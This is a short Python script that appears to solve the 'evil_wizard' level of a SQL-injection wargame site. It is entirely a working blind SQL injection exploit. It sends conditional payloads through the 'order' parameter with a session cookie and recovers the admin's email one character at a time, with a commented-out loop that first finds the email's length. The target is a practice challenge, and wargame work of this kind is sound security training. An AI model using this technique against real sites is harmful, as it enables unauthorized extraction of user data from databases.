import requests

url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"

cookie = {'PHPSESSID' : 'ovbfdu14h0vaeamskdlr10nttu'}

# for len in range(100):
#   param = {'order': f"if(id='admin' and length(email)={len},1,10)#"}
#   res = requests.get(url=url, params=param, cookies=cookie)
#   if 'score</th><tr><td>admin' in res.text:
#     print(len)
#     break

length = 30
email = ""
for len in range(1, length+1):
  for char in range(ord('0'), ord('z')):
    param = {'order': f"if(id='admin' and ord(substr(email,{str(len)},1))={str(char)}, 1, 10)#"}
    res = requests.get(url=url, params=param, cookies=cookie)
    if 'score</th><tr><td>admin' in res.text:
      email += chr(char)
      print(email)
      break
        
print(email.lower())